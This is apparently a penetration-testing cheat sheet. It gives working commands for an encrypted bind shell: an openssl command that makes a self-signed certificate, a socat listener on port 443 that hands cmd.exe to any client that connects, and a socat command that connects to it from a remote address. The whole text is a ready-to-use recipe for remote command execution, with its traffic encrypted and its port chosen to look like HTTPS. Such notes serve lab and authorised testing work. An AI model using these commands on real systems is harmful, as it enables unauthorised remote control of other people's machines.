# 1) Generate TLS cert for encrypted comms
```sh
# Generate self-signed keypair
openssl req \
-newkey rsa:2048 \
-nodes \
-keyout bind_shell.key \
-x509 \
-days 362 \
-out bind_shell.crt

# concat files for use with socat
cat bind_shell.key bind_shell.crt > bind_shell.pem
```

# 2) Create encrypted cmd shell and listen for connections
```bat
set LPORT=443
socat OPENSSL-LISTEN:%LPORT%,cert=bind_shell.pem,verify=0,fork EXEC:cmd.exe,pipes
```

# 3) Connect to remote encrypted bind shell
```
RHOST=192.168.202.10
RPORT=443
socat - OPENSSL:$RHOST:$RPORT,verify=0
```
